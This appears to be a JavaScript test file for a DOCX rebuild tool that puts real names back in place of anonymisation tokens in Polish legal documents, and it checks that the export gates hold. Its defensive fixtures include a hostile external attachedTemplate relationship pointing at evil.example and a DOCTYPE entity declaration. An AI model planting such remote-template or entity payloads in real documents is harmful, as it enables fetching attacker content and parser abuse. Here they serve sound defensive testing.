// @vitest-environment jsdom
//
// Integration of the whole rebuild flow (MD5-core): golden docx in → tokens
// replaced across document and header, untouched parts byte-identical
// (C-DOCX-10), no relationship ever added (C-DOCX-5), export gates enforced.
// Fixtures use store (method 0) so jsdom needs no CompressionStream.
import { buildZip } from './test-helpers/zip-fixture.js';
import { openZip } from './zip-reader.js';
import { rebuildDocx } from './rebuild-docx.js';

const XML_DECL = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>';
const W = 'http://schemas.openxmlformats.org/wordprocessingml/2006/main';
const CT = `${XML_DECL}<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">`
  + '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
  + '<Default Extension="xml" ContentType="application/xml"/>'
  + '<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>'
  + '</Types>';
const ROOT_RELS = `${XML_DECL}<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">`
  + '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>'
  + '</Relationships>';
const DOC_RELS = `${XML_DECL}<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">`
  + '<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/header" Target="header1.xml"/>'
  + '</Relationships>';
const STYLES = `${XML_DECL}<w:styles xmlns:w="${W}"><w:style w:type="paragraph" w:styleId="Nag"><w:name w:val="Papier K-Law"/></w:style></w:styles>`;

// Token split across runs, like a real Word file (proofErr between).
const DOC = `${XML_DECL}<w:document xmlns:w="${W}"><w:body>`
  + '<w:p><w:r><w:rPr><w:b/></w:rPr><w:t xml:space="preserve">Pozwany [PERSON_</w:t></w:r>'
  + '<w:proofErr w:type="spellStart"/>'
  + '<w:r><w:t>NAME_1] wnosi o oddalenie.</w:t></w:r></w:p>'
  + '<w:p><w:r><w:t>Nieznany [PERSON_NAME_9] zostaje.</w:t></w:r></w:p>'
  + '</w:body></w:document>';
const HEADER = `${XML_DECL}<w:hdr xmlns:w="${W}"><w:p><w:r><w:t>Sygn. akt [CASE_NUMBER_1]</w:t></w:r></w:p></w:hdr>`;

const LEGEND = {
  '[PERSON_NAME_1]': 'Jan Kowalski',
  '[CASE_NUMBER_1]': 'I C 1552/23',
};

function goldenParts(overrides = {}) {
  return {
    '[Content_Types].xml': CT,
    '_rels/.rels': ROOT_RELS,
    'word/_rels/document.xml.rels': DOC_RELS,
    'word/document.xml': DOC,
    'word/header1.xml': HEADER,
    'word/styles.xml': STYLES,
    ...overrides,
  };
}

async function docxBytes(parts) {
  return buildZip(Object.entries(parts).map(([name, data]) => ({ name, data, method: 0 })));
}

const decode = (u8) => new TextDecoder().decode(u8);

describe('rebuildDocx — golden flow', () => {
  it('replaces tokens in document and header, keeps untouched parts byte-identical', async () => {
    const input = await docxBytes(goldenParts());
    const { status, bytes, report } = await rebuildDocx(input, LEGEND);
    expect(status).toBe('ok');

    const result = openZip(bytes);
    const doc = decode(await result.extract('word/document.xml'));
    expect(doc).toContain('Pozwany Jan Kowalski');
    expect(doc).not.toContain('[PERSON_NAME_1]');
    expect(doc).toContain('[PERSON_NAME_9]'); // fail-safe: unknown token stays visible
    const header = decode(await result.extract('word/header1.xml'));
    expect(header).toContain('Sygn. akt I C 1552/23');

    // C-DOCX-10: parts without replacements travel verbatim (compressed bytes).
    const source = openZip(input);
    for (const untouched of ['word/styles.xml', '[Content_Types].xml', '_rels/.rels', 'word/_rels/document.xml.rels']) {
      expect(result.extractRaw(untouched).compressedBytes).toEqual(source.extractRaw(untouched).compressedBytes);
    }
    // C-DOCX-5: the entry set is identical — nothing added, nothing dropped.
    expect(result.entries.map((e) => e.name).sort()).toEqual(source.entries.map((e) => e.name).sort());

    expect(report.totals).toEqual({ replaced: 2, left: 1 });
    expect(report.parts.find((p) => p.part === 'word/document.xml').left[0]).toMatchObject({
      token: '[PERSON_NAME_9]',
      reason: 'brak-w-legendzie',
    });
    expect(report.egress).toEqual({ hyperlinks: 0, blocked: [] });
  });

  it('report-only layers surface in the report without being touched', async () => {
    const withComments = goldenParts({
      'word/_rels/document.xml.rels': DOC_RELS.replace('</Relationships>',
        '<Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/comments" Target="comments.xml"/></Relationships>'),
      'word/comments.xml': `${XML_DECL}<w:comments xmlns:w="${W}"><w:comment w:id="1"><w:p><w:r><w:t>uwaga o [PERSON_NAME_1]</w:t></w:r></w:p></w:comment></w:comments>`,
    });
    const { status, bytes, report } = await rebuildDocx(await docxBytes(withComments), LEGEND);
    expect(status).toBe('ok');
    expect(report.reportOnly).toContainEqual({ part: 'word/comments.xml', warstwa: 'komentarze', tokens: 1 });
    const result = openZip(bytes);
    expect(decode(await result.extract('word/comments.xml'))).toContain('[PERSON_NAME_1]');
  });
});

describe('rebuildDocx — export gates', () => {
  it('egress findings block the export with no bytes (§9.3, P-2 hard)', async () => {
    const hostile = goldenParts({
      'word/_rels/settings.xml.rels': `${XML_DECL}<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">`
        + '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://evil.example/t.dotm" TargetMode="External"/>'
        + '</Relationships>',
    });
    const { status, bytes, report } = await rebuildDocx(await docxBytes(hostile), LEGEND);
    expect(status).toBe('blocked-egress');
    expect(bytes).toBeNull();
    expect(report.egress.blocked).toHaveLength(1);
  });

  it('zero replacements block the export (§6.3, P-4)', async () => {
    const { status, bytes, report } = await rebuildDocx(await docxBytes(goldenParts()), { '[INNA_LEGENDA_1]': 'x' });
    expect(status).toBe('blocked-no-replacements');
    expect(bytes).toBeNull();
    expect(report.totals.replaced).toBe(0);
  });

  it('hostile containers are rejected before any legend value is read', async () => {
    const doctype = goldenParts({
      'word/document.xml': `<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e "y">]><w:document xmlns:w="${W}"><w:body/></w:document>`,
    });
    await expect(rebuildDocx(await docxBytes(doctype), LEGEND)).rejects.toMatchObject({ code: 'DOCTYPE' });
  });
});
